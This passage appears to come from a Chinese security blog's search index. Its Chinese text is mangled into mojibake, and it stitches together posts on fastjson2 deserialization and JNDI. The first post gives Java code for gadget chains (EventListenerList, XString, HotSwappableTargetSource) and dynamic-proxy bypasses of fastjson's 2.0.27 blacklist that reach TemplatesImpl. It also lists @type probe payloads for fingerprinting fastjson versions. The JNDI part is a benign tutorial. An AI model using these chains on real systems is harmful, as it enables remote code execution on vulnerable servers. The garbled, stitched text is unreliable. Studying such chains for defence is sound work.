é«˜ç‰ˆæœ¬çš„ä¸€äº›ç»•è¿‡jdk17çš„æ—¶å€™å‘ç°BadAttributeValueExpException.readObject()æ— æ³•ä½œä¸ºsourceï¼Œå› æ­¤å°±éœ€è¦æ‰¾å…¶ä»–çš„è§¦å‘toString()çš„é“¾æ‹¼èµ·æ¥ å…¶ä»–è§¦å‘toString() EventListenerListåˆ©ç”¨é“¾ï¼šEventListenerList.readObject() - UndoManager#toString() -Vector#toString() åˆ©ç”¨ä»£ç  Vector vector = new Vector();vector.add(jsonArray);UndoManager undoManager = new UndoManager();setField(undoManager,edits,vector);EventListenerList eventListenerList = new EventListenerList();setField(eventListenerList,listenerList,new Object[]Class.class,undoManager);unser(ser(eventListenerList)); è°ƒç”¨æ ˆ toString:886, JSONArray (com.alibaba.fastjson2)toString:266, CompoundEdit (javax.swing.undo)toString:695, UndoManager (javax.swing.undo)add:213, EventListenerList (javax.swing.event)readObject:309, EventListenerList (javax.swing.event)readObject:467, ObjectInputStream (java.io) XStringHashMap#readObject()-putVal()-equals()-XString.equals()-toString() è‡ªå·±å†™äº†ä¸ªæ–¹æ³• public static HashMap getXString(Object obj) throws Exception //objä¼ å…¥å¾…è§¦å‘toString()çš„ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µæŠŠXStringæ¢äº†ï¼Œç”¨æ¥æ¥ä»»æ„equals XString xstring=new XString(); HashMap hashMap1 = new HashMap(); HashMap hashMap2 = new HashMap(); hashMap1.put(zZ,obj); hashMap1.put(yy,xstring); hashMap2.put(zZ,xstring); hashMap2.put(yy,obj); HashMap hashMap = new HashMap(); hashMap.put(hashMap1, 1); hashMap.put(hashMap2, 2); setHashMapKey(hashMap,hashMap1,hashMap1);//é¿å…æå‰è§¦å‘æŠ›å¼‚å¸¸å¯¼è‡´ç¨‹åºæ— æ³•ç»§ç»­è¿›è¡Œ setHashMapKey(hashMap,hashMap2,hashMap2); return hashMap; HotSwappableTargetSourceåˆ©ç”¨é“¾ï¼šHashMap#readObject - HotSwappableTargetSource#equals - XString#equals - toString HotSwappableTargetSourceç±»çš„hashCode()æ–¹æ³•å§‹ç»ˆè¿”å›å®šå€¼ ä¸ºåç»­åœ¨putVal()ä¸­åˆ¤æ–­å“ˆå¸Œå†²çªæä¾›äº†å¯åˆ©ç”¨æ¡ä»¶ public static void main(String[] args) throws Exception JSONArray jsonArray = new JSONArray(); jsonArray.add(getTemplates()); unser(ser(getHotSwappableTargetSource(jsonArray))); public static HashMap getHotSwappableTargetSource(Object obj) throws Exception HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(obj); HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(x)); HashMap hashMap = new HashMap(); hashMap.put(1, hotSwappableTargetSource1); hashMap.put(2, hotSwappableTargetSource2); setHashMapKey(hashMap,1,hotSwappableTargetSource1); setHashMapKey(hashMap,2,hotSwappableTargetSource2); return hashMap; é«˜ç‰ˆæœ¬ï¼ˆ2.0.26ï¼‰ç»•è¿‡å¯¹äºfastjsonæ¥è®²ï¼Œä»2.0.27ç‰ˆæœ¬å¼€å§‹ï¼Œå…¶åœ¨åŸç”Ÿååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è®¾ç½®äº†é»‘åå•é™åˆ¶ï¼Œåœ¨é»‘åå•ä¸­çš„ç±»å¹¶ä¸ä¼šè¢«è°ƒç”¨getteræ–¹æ³• fastjsonä¸­2.0.27ç‰ˆæœ¬å¼€å§‹ï¼Œåœ¨toStringè°ƒç”¨çš„å¿…ç»ä¹‹è·¯ä¸Šè®¾ç½®äº†é»‘åå•æ£€æŸ¥ï¼Œå¦‚æœè°ƒç”¨çš„ç±»åœ¨é»‘åå•ä¸­åˆ™å¿½è§†å¯¹åº”çš„è°ƒç”¨è¿‡ç¨‹ï¼Œå…·ä½“å¯è§BeanUtils#ignoreæ–¹æ³• é»‘åå•ç»•è¿‡æ—¢ç„¶è®¾ç½®äº†é»‘åå•è¿‡æ»¤çš„æ–¹å¼è¿›è¡Œé˜²å¾¡ï¼Œç±»ä¼¼äºfastjson1.2.xç³»åˆ—çš„ç»•è¿‡æ–¹å¼ï¼Œå¯ä»¥é‡‡ç”¨é»‘åå•ç»•è¿‡çš„æ–¹å¼è¿›è¡Œbypass ä¹Ÿå³æ˜¯å¯»æ‰¾ä¸åœ¨é»‘åå•çš„ç±»ï¼Œä¸”å…¶getteræ–¹æ³•èƒ½å¤Ÿä½œä¸ºsinkç‚¹ å‚è€ƒæ–‡çŒ®ä¸­æåˆ°äº†ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯ä¾èµ–com.mchange:mchange-commons-javaçš„com.mchange.v2.naming.ReferenceIndirector$ReferenceSerializedç±»å’ŒJDKä¸‹çš„LdapAttribute#getAttributeDefinitionæ–¹æ³•ï¼Œå…¶å®è¿˜å­˜åœ¨å¾ˆå¤šä¸åœ¨é»‘åå•ä¸­çš„ç±»å¯ä»¥ä½œä¸ºsinkç‚¹ï¼Œä¾‹å¦‚ sun.print.UnixPrintServiceLookup#getDefaultPrintServicejavax.naming.spiContinuationDirContext#getTargetContextcom.sun.media.sound.JARSoundbankReader#getSoundbank.... åŠ¨æ€ä»£ç†çš„ç»•è¿‡æ–¹å¼JdkDynamicAopProxyè‹¥ç±»ä¸ºä»£ç†ç±»ï¼Œåˆ™å…¶åªä¼šå°†ä»£ç†çš„æ¥å£ç±»è¿›è¡Œé»‘åå•æ£€æŸ¥ï¼Œå¹¶ä¸ä¼šå¯¹ä»£ç†çš„å…·ä½“å¯¹è±¡è¿›è¡Œé»‘åå•æ£€æŸ¥ ä½¿ç”¨JdkDynamicAopProxyè¿›è¡ŒTemplateImplå¯¹è±¡çš„ä»£ç†ï¼Œç‰¹åˆ«çš„æˆ‘ä»¬éœ€è¦çš„getOutputPropertiesæ–¹æ³•åœ¨Templateæ¥å£ä¸­ï¼Œè¯¥æ¥å£å¹¶ä¸åœ¨é»‘åå•å†…ï¼Œèƒ½å¤Ÿè¿›è¡Œç»•è¿‡ @Overridepublic Object pack(Object obj) throws Exception // JdkDynamicAopProxy AdvisedSupport as = new AdvisedSupport(); as.setTargetSource(new SingletonTargetSource(obj)); Object o = ReflectionHelper.newInstance(org.springframework.aop.framework.JdkDynamicAopProxy, new Class[]AdvisedSupport.class, as); Proxy proxy = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(), new Class[]Templates.class, (InvocationHandler)o); JSONObject map = new JSONObject(); map.put(ysomap, proxy); return PayloadHelper.makeReadObjectToStringTrigger(map); é“¾å­å¦‚ä¸‹ï¼š AutowireUtils$ObjectFactoryDelegatingInvocationHandlerè¿™ä¸ªä»£ç†ç±»åœ¨Spring1é“¾å­ä¸­æœ‰æ‰€ä½¿ç”¨ï¼Œå’ŒJdkDynamicAopProxyç±»ä¼¼ï¼Œä¹Ÿèƒ½å¤Ÿåå°„è°ƒç”¨æ–¹æ³•ï¼Œä½†æ˜¯ç¼ºç‚¹åœ¨äºå…¶å¯¹è±¡æ¥è‡ªäºthis.objectFactory.getObject()çš„è¿”å›ï¼Œéœ€è¦æ‰¾åˆ°èƒ½å¤Ÿè¿”å›æ¶æ„å¯¹è±¡çš„ä»£ç†ç±»å¯¹objectFactoryè¿›è¡Œä»£ç† è§‚å¯ŸObjectFactoryDelegatingInvocationHandlerçš„ä»£ç ï¼Œä¹Ÿæœ‰åå°„è°ƒç”¨æ–¹æ³•çš„èƒ½åŠ›ï¼Œä¸åŒä¹‹å¤„åœ¨äºåå°„å¯¹è±¡æ˜¯é€šè¿‡objectFactory.getObject()æä¾›çš„ã€‚ æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©this.objectFactory.getObject()è¿”å›teamplatesImplï¼Œè®©ä¸€ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªæŒ‡å®šçš„å¯¹è±¡ï¼Œæ€ä¹ˆçœ‹èµ·æ¥å¦‚æ­¤ç†Ÿæ‚‰ï¼Œè¿™ä¸å°±æ˜¯å‰é¢æåˆ°çš„AnnotationInvocationHandlerçš„ä½œç”¨ä¹‹ä¸€å—ï¼Ÿ ä½†ä¹Ÿæ­£å¦‚å‰é¢åˆ†æï¼Œé«˜ç‰ˆæœ¬jdkä¸‹çš„AnnotationInvocationHandlerå·²ç»æ— æ³•ä»£ç†éæ³¨è§£ç±»äº†ï¼Œå…ˆç®€å•çœ‹äº†ä¸€ä¸‹org.springframework.beans.factory.ObjectFactoryçš„å­ç±»ï¼Œæ²¡æœ‰æ‰¾åˆ°ç›´æ¥æ»¡è¶³ç›®æ ‡çš„ã€‚æ‰€ä»¥æ€è·¯åˆå›åˆ°äº†åŠ¨æ€ä»£ç†ä¸Šé¢ï¼Œèƒ½ä¸èƒ½æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼AnnotationInvocationHandlerä½œç”¨çš„åŠ¨æ€ä»£ç†ï¼Œä¹Ÿå³ï¼šé€šè¿‡åŠ¨æ€ä»£ç†è°ƒç”¨ï¼Œè®©ç‰¹å®šæ–¹æ³•è¿”å›ä¸€ä¸ªæŒ‡å®šçš„å¯¹è±¡ã€‚ æœ€ç»ˆå‘ç°Fatsjsonè‡ªèº«çš„com.alibaba.fastjson2.JSONObjectå°±æ˜¯ä¸€ä¸ªæ»¡è¶³éœ€æ±‚çš„åŠ¨æ€ä»£ç†ï¼šå¯ä»¥è®©ä»»æ„getteræ–¹æ³•è¿”å›ä¸€ä¸ªæŒ‡å®šçš„å¯¹è±¡ã€‚ æœ€ç»ˆæ–¹æ¡ˆï¼š ç”¨ObjectFactoryDelegatingInvocationHandlerä»£ç†Templatesæ¥å£ï¼Œè¢«è°ƒç”¨getOutputPropertiesæ–¹æ³• ç”¨JSONObjectä»£ç†ObjectFactoryDelegatingInvocationHandlerä¸­çš„objectFactoryå±æ€§ï¼Œè¿”å›teamplatesImpl è°ƒç”¨é“¾å¦‚ä¸‹ï¼š ä¸Šé¢ä¸¤ä¸ªåŠ¨æ€ä»£ç†ç»•è¿‡çš„ä»£ç å¯å‚è€ƒï¼šhttps://github.com/Ape1ron/FastjsonInDeserializationDemo1 é»‘ç›’æƒ…å†µä¸‹åˆ¤æ–­fastjsonç‰ˆæœ¬æ— æŠ¥é”™ä¿¡æ¯æ¢æµ‹https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA ã€ä¸æŠ¥é”™ã€‘1.2.831.2.24 ã€æŠ¥é”™ã€‘1.2.25-1.2.80 zero:@type:java.lang.Exception,@type:org.XxException ã€ä¸æŠ¥é”™ã€‘1.2.24-1.2.68 ã€æŠ¥é”™ã€‘1.2.70-1.2.83 zero:@type:java.lang.AutoCloseable,@type:java.io.ByteArrayOutputStream ã€ä¸æŠ¥é”™ã€‘1.2.24-1.2.47 ã€æŠ¥é”™ã€‘1.2.48-1.2.83 a: @type: java.lang.Class, val: com.sun.rowset.JdbcRowSetImpl , b: @type: com.sun.rowset.JdbcRowSetImpl ã€ä¸æŠ¥é”™ã€‘1.2.24 ã€æŠ¥é”™ã€‘1.2.25-1.2.83 zero: @type: com.sun.rowset.JdbcRowSetImpl æœ‰æŠ¥é”™ä¿¡æ¯æ£€æµ‹è¿™ä¸ªå°±éå¸¸ç®€å•ï¼Œå‡ å¹´å‰æµ…è“åšå®¢å°±å†™æ˜ç™½äº† https://b1ue.cn/archives/402.html @type:java.lang.AutoCloseablea[test:1]","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹jndi","path":"/2025/02/01/javaååºåˆ—åŒ–ä¹‹jndi/","content":"å¼•ç”¨Javaå®‰å…¨å­¦ä¹ â€”â€”JNDIæ³¨å…¥ JDK é«˜ç‰ˆæœ¬ä¸‹ JNDI æ³¨å…¥æ·±åº¦å‰–æ-å…ˆçŸ¥ç¤¾åŒº https://www.cnblogs.com/LittleHann/p/17768907.html JNDIæ¦‚è¿°JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰æ˜¯SUNå…¬å¸æä¾›çš„ä¸€ç§æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ã€‚JNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œå¹¶ç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ï¼Œä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚ç®€å•æ¥è¯´ï¼Œå¼€å‘äººå‘˜é€šè¿‡åˆç†çš„ä½¿ç”¨JNDIï¼Œèƒ½å¤Ÿè®©ç”¨æˆ·é€šè¿‡ç»Ÿä¸€çš„æ–¹å¼è®¿é—®è·å–ç½‘ç»œä¸Šçš„å„ç§èµ„æºå’ŒæœåŠ¡ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º å‘½åæœåŠ¡ï¼ˆNaming Serverï¼‰å‘½åæœåŠ¡ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸€ç§é€šè¿‡åç§°æ¥æŸ¥æ‰¾å®é™…å¯¹è±¡çš„æœåŠ¡ã€‚æ¯”å¦‚æˆ‘ä»¬çš„RMIåè®®ï¼Œå¯ä»¥é€šè¿‡åç§°æ¥æŸ¥æ‰¾å¹¶è°ƒç”¨å…·ä½“çš„è¿œç¨‹å¯¹è±¡ã€‚å†æ¯”å¦‚æˆ‘ä»¬çš„DNSåè®®ï¼Œé€šè¿‡åŸŸåæ¥æŸ¥æ‰¾å…·ä½“çš„IPåœ°å€ã€‚è¿™äº›éƒ½å¯ä»¥å«åšå‘½åæœåŠ¡ã€‚ ä¾‹å­ï¼šDNSï¼ˆåŸŸåç³»ç»Ÿï¼‰ åœºæ™¯ï¼šå½“ä½ åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ www.google.com æ—¶ï¼Œæµè§ˆå™¨éœ€è¦çŸ¥é“è¿™ä¸ªåŸŸåå¯¹åº”çš„ IP åœ°å€æ‰èƒ½è®¿é—®ç½‘ç«™ã€‚ å‘½åæœåŠ¡çš„ä½œç”¨ï¼š DNS å°†åŸŸåï¼ˆåç§°ï¼‰æ˜ å°„åˆ° IP åœ°å€ï¼ˆå¯¹è±¡ï¼‰ã€‚ ä¾‹å¦‚ï¼š åç§°ï¼šwww.google.com å¯¹è±¡ï¼š142.250.190.78ï¼ˆGoogle çš„ IP åœ°å€ï¼‰ ç±»æ¯”ï¼š å°±åƒä½ é€šè¿‡ç”µè¯ç°¿æŸ¥æ‰¾â€œå¼ ä¸‰â€çš„åå­—ï¼Œæ‰¾åˆ°ä»–çš„ç”µè¯å·ç ä¸€æ ·ã€‚ åœ¨å‘½åæœåŠ¡ä¸­ï¼Œæœ‰å‡ ä¸ªé‡è¦çš„æ¦‚å¿µã€‚ Bindingsï¼šè¡¨ç¤ºä¸€ä¸ªåç§°å’Œå¯¹åº”å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæ¯”å¦‚åœ¨åœ¨ DNS ä¸­åŸŸåç»‘å®šåˆ°å¯¹åº”çš„ IPï¼Œåœ¨RMIä¸­è¿œç¨‹å¯¹è±¡ç»‘å®šåˆ°å¯¹åº”çš„name,æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶åç»‘å®šåˆ°å¯¹åº”çš„æ–‡ä»¶ã€‚ Contextï¼šä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­å¯¹åº”ç€ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾åç§°å¯¹åº”çš„å¯¹è±¡ã€‚æ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå¯ä»¥åœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶ï¼Œå…¶ä¸­å­ç›®å½•ä¹Ÿå¯ä»¥ç§°ä¸ºå­ä¸Šä¸‹æ–‡ (SubContext)ã€‚ Referencesï¼šåœ¨ä¸€ä¸ªå®é™…çš„åç§°æœåŠ¡ä¸­ï¼Œæœ‰äº›å¯¹è±¡å¯èƒ½æ— æ³•ç›´æ¥å­˜å‚¨åœ¨ç³»ç»Ÿå†…ï¼Œè¿™æ—¶å®ƒä»¬ä¾¿ä»¥å¼•ç”¨çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå¯ä»¥ç†è§£ä¸º CC++ ä¸­çš„æŒ‡é’ˆã€‚å¼•ç”¨ä¸­åŒ…å«äº†è·å–å®é™…å¯¹è±¡æ‰€éœ€çš„ä¿¡æ¯ï¼Œç”šè‡³å¯¹è±¡çš„å®é™…çŠ¶æ€ã€‚æ¯”å¦‚æ–‡ä»¶ç³»ç»Ÿä¸­å®é™…æ ¹æ®åç§°æ‰“å¼€çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªæ•´æ•° fd (file descriptor)ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå†…æ ¸æ ¹æ®è¿™ä¸ªå¼•ç”¨å€¼å»æ‰¾åˆ°ç£ç›˜ä¸­çš„å¯¹åº”ä½ç½®å’Œè¯»å†™åç§»ã€‚ ç›®å½•æœåŠ¡ï¼ˆDirectory Serviceï¼‰ç®€å•æ¥è¯´ï¼Œç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‰©å±•ï¼Œé™¤äº†åç§°æœåŠ¡ä¸­å·²æœ‰çš„åç§°åˆ°å¯¹è±¡çš„å…³è”ä¿¡æ¯å¤–ï¼Œè¿˜å…è®¸å¯¹è±¡æ‹¥æœ‰å±æ€§ï¼ˆAttributesï¼‰ä¿¡æ¯ã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥æ ¹æ®åç§°å»æŸ¥æ‰¾ï¼ˆLookupï¼‰å¯¹è±¡(å¹¶è·å–å…¶å¯¹åº”å±æ€§)ï¼Œè¿˜å¯ä»¥æ ¹æ®å±æ€§å€¼å»æœç´¢ï¼ˆSearchï¼‰å¯¹è±¡ã€‚ ä¸€äº›å¸¸è§çš„ç›®å½•æœåŠ¡æœ‰ï¼š LDAPï¼š è½»å‹ç›®å½•è®¿é—®åè®® Active Directory: ä¸º Windows åŸŸç½‘ç»œè®¾è®¡ï¼ŒåŒ…å«å¤šä¸ªç›®å½•æœåŠ¡ï¼Œæ¯”å¦‚åŸŸåæœåŠ¡ã€è¯ä¹¦æœåŠ¡ç­‰ï¼› å…¶ä»–åŸºäº X.500 (ç›®å½•æœåŠ¡çš„æ ‡å‡†) å®ç°çš„ç›®å½•æœåŠ¡ï¼› ä¾‹å­ï¼šLDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰ åœºæ™¯ï¼šå…¬å¸å†…éƒ¨æœ‰ä¸€ä¸ªå‘˜å·¥ä¿¡æ¯ç›®å½•ï¼Œä½ éœ€è¦æŸ¥æ‰¾æŸä¸ªå‘˜å·¥çš„è¯¦ç»†ä¿¡æ¯ã€‚ ç›®å½•æœåŠ¡çš„ä½œç”¨ï¼š LDAP ä¸ä»…å¯ä»¥é€šè¿‡å‘˜å·¥å§“åæ‰¾åˆ°å¯¹åº”çš„å‘˜å·¥å¯¹è±¡ï¼Œè¿˜å¯ä»¥æŸ¥è¯¢è¯¥å‘˜å·¥çš„å±æ€§ï¼ˆå¦‚èŒä½ã€é‚®ç®±ã€ç”µè¯ç­‰ï¼‰ã€‚ ä¾‹å¦‚ï¼š åç§°ï¼šcn=å¼ ä¸‰,ou=ç ”å‘éƒ¨,dc=å…¬å¸,dc=com å¯¹è±¡ï¼šå‘˜å·¥â€œå¼ ä¸‰â€çš„ä¿¡æ¯ã€‚ å±æ€§ï¼š èŒä½ï¼šèŒä½=è½¯ä»¶å·¥ç¨‹å¸ˆ é‚®ç®±ï¼šé‚®ç®±=zhangsan@company.com ç”µè¯ï¼šç”µè¯=123456789 ç±»æ¯”ï¼š å°±åƒä½ é€šè¿‡å‘˜å·¥ç®¡ç†ç³»ç»ŸæŸ¥æ‰¾â€œå¼ ä¸‰â€ï¼Œä¸ä»…èƒ½æ‰¾åˆ°ä»–çš„è”ç³»æ–¹å¼ï¼Œè¿˜èƒ½çœ‹åˆ°ä»–çš„èŒä½ã€éƒ¨é—¨ç­‰è¯¦ç»†ä¿¡æ¯ã€‚ JNDI SPIJNDI æ¶æ„ä¸Šä¸»è¦åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå³ Java çš„åº”ç”¨å±‚æ¥å£å’Œ SPIï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º SPIï¼ˆService Provider Interfaceï¼‰ï¼Œå³æœåŠ¡ä¾›åº”æ¥å£ï¼Œä¸»è¦ä½œç”¨æ˜¯ä¸ºåº•å±‚çš„å…·ä½“ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€æ¥å£ï¼Œä»è€Œå®ç°ç›®å½•æœåŠ¡çš„å¯æ’æ‹”å¼å®‰è£…ã€‚ JDK ä¸­åŒ…å«äº†ä¸‹è¿°å†…ç½®çš„å‘½åç›®å½•æœåŠ¡: RMI: Java Remote Method Invocationï¼ŒJava è¿œç¨‹æ–¹æ³•è°ƒç”¨ LDAP: è½»é‡çº§ç›®å½•è®¿é—®åè®® CORBA: Common Object Request Broker Architectureï¼Œé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„ï¼Œç”¨äº COS åç§°æœåŠ¡(Common Object Services) DNSï¼ˆåŸŸåè½¬æ¢åè®®ï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥åœ¨ Java å®˜ç½‘ä¸‹è½½å…¶ä»–ç›®å½•æœåŠ¡å®ç°ã€‚ç”±äº SPI çš„ç»Ÿä¸€æ¥å£ï¼Œå‚å•†ä¹Ÿå¯ä»¥æä¾›è‡ªå·±çš„ç§æœ‰ç›®å½•æœåŠ¡å®ç°ï¼Œç”¨æˆ·æ— éœ€é‡å¤ä¿®æ”¹ä»£ç ã€‚ JNDIä»£ç ç¤ºä¾‹JNDI æ¥å£ä¸»è¦åˆ†ä¸ºä¸‹è¿° 5 ä¸ªåŒ…: javax.namingï¼šä¸»è¦ç”¨äºå‘½åæ“ä½œï¼Œå®ƒåŒ…å«äº†å‘½åæœåŠ¡çš„ç±»å’Œæ¥å£ï¼Œè¯¥åŒ…å®šä¹‰äº†Contextæ¥å£å’ŒInitialContextç±» javax.naming.directoryï¼šä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir-Contextç±» javax.naming.eventï¼šåœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥ javax.naming.ldapï¼šæä¾›LDAPæœåŠ¡æ”¯æŒ javax.naming.spiï¼šå…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡ JNDI_RMIJDKç‰ˆæœ¬ä¸ºJDK8u_65 é¦–å…ˆåœ¨æœ¬åœ°èµ·ä¸€ä¸ªRMIæœåŠ¡ï¼ˆæˆ‘ç”¨çš„è¿˜æ˜¯è‡ªå·±å­¦ä¹ rmiæ—¶å€™çš„ä¾‹å­ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±å»ç¿»ä¸€ä¸‹å‰é¢çš„æ–‡ç« ï¼‰ ä¸Šé¢çš„ç›®çš„æ˜¯ä¸ºäº†åˆ›å»ºä¸€ä¸ªæ³¨å†Œè¡¨ åœ¨è¿™ä¹‹åï¼Œæ–‡ä»¶JNDIRMIServerçš„ä»£ç å¦‚ä¸‹ import javax.naming.InitialContext;public class JNDIRMIServer public static void main(String[] args) throws Exception // InitialContext æ˜¯ JNDI çš„å…¥å£ç‚¹ï¼Œç”¨äºè¿æ¥åˆ°å‘½åæœåŠ¡ï¼ˆå¦‚ RMI æ³¨å†Œè¡¨ã€LDAP ç­‰ï¼‰ InitialContext initialContext = new InitialContext(); initialContext.rebind(rmi://localhost:1099/remoteObj, new RemoteObjImpl()); æ–‡ä»¶JNDIRMIClientä»£ç å¦‚ä¸‹ï¼š import javax.naming.InitialContext;public class JNDIRMIClient public static void main(String[] args) throws Exception InitialContext initialContext = new InitialContext(); IRemoteObj remoteObj = (IRemoteObj)initialContext.lookup(rmi://localhost:1099/remoteObj); System.out.println(remoteObj.sayHello(hello)); ä¸¤æ–‡ä»¶éƒ½è¿è¡Œåï¼Œå®¢æˆ·ç«¯æˆåŠŸæ‰§è¡Œäº†sayHelloæ–¹æ³• JNDI_DNSimport javax.naming.Context;import javax.naming.NamingException;import javax.naming.directory.Attributes;import javax.naming.directory.DirContext;import javax.naming.directory.InitialDirContext;import java.util.Hashtable; public class JNDI_DNS public static void main(String[] args) HashtableString,String env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, com.sun.jndi.dns.DnsContextFactory); env.put(Context.PROVIDER_URL, dns://192.168.43.1); try DirContext ctx = new InitialDirContext(env); Attributes res = ctx.getAttributes(goodapple.top, new String[] A); System.out.println(res); catch (NamingException e) e.printStackTrace(); è¿è¡Œç»“æœå¦‚ä¸‹ï¼š JNDIçš„å·¥ä½œæµç¨‹åœ¨ä¸Šæ–‡ï¼Œæˆ‘ä»¬é€šè¿‡JNDIæˆåŠŸåœ°è°ƒç”¨äº†RMIå’ŒDNSæœåŠ¡ã€‚é‚£ä¹ˆå¯¹äºJNDIæ¥è®²ï¼Œå®ƒæ˜¯å¦‚ä½•è¯†åˆ«æˆ‘ä»¬è°ƒç”¨çš„æ˜¯ä½•ç§æœåŠ¡å‘¢ï¼Ÿè¿™å°±ä¾èµ–äºæˆ‘ä»¬ä¸Šé¢æåˆ°çš„Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰äº†ã€‚ åˆå§‹åŒ–Contextæˆ‘ä»¥RMIæœåŠ¡ä¸ºä¾‹ //è®¾ç½®JNDIç¯å¢ƒå˜é‡HashtableString, String env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY, com.sun.jndi.rmi.registry.RegistryContextFactory);env.put(Context.PROVIDER_URL, rmi://localhost:1099);//åˆå§‹åŒ–ä¸Šä¸‹æ–‡Context initialContext = new InitialContext(env); é¦–å…ˆä½¿ç”¨Hashtableç±»æ¥è®¾ç½®å±æ€§*INITIAL_CONTEXT_FACTORY*å’Œ*PROVIDER_URL*çš„å€¼ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæˆ‘ä»¬å°†*INITIAL_CONTEXT_FACTORY*è®¾ç½®ä¸ºäº†com.sun.jndi.rmi.registry.RegistryContextFactoryï¼ŒJNDIæ­£æ˜¯é€šè¿‡è¿™ä¸€å±æ€§æ¥åˆ¤æ–­æˆ‘ä»¬å°†è¦è°ƒç”¨ä½•ç§æœåŠ¡ã€‚ æ¥ç€æˆ‘ä»¬å°†å±æ€§PROVIDER_URLè®¾ç½®ä¸ºäº†rmi://localhost:1099ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬RMIæœåŠ¡çš„åœ°å€ã€‚JNDIé€šè¿‡è¯¥å±æ€§æ¥è·å–æœåŠ¡çš„è·¯å¾„ï¼Œè¿›è€Œè°ƒç”¨è¯¥æœåŠ¡ã€‚ æœ€åå‘InitialContextç±»ä¼ å…¥æˆ‘ä»¬è®¾ç½®çš„å±æ€§å€¼æ¥åˆå§‹åŒ–ä¸€ä¸ªContextï¼Œäºæ˜¯æˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªä¸RMIæœåŠ¡ç›¸å…³è”çš„ä¸Šä¸‹æ–‡Contextã€‚ å½“ç„¶ï¼Œåˆå§‹åŒ–Contextçš„æ–¹æ³•å¤šç§å¤šæ ·ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹InitialContextç±»çš„æ„é€ å‡½æ•° //æ„å»ºä¸€ä¸ªé»˜è®¤çš„åˆå§‹ä¸Šä¸‹æ–‡public InitialContext(); //æ„é€ ä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©ä¸åˆå§‹åŒ–å®ƒã€‚protected InitialContext(boolean lazy); //ä½¿ç”¨æä¾›çš„ç¯å¢ƒå˜é‡åˆå§‹åŒ–ä¸Šä¸‹æ–‡ã€‚public InitialContext(Hashtable?,? environment); æ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥ç”¨å¦‚ä¸‹æ–¹å¼æ¥åˆå§‹åŒ–ä¸€ä¸ªContext 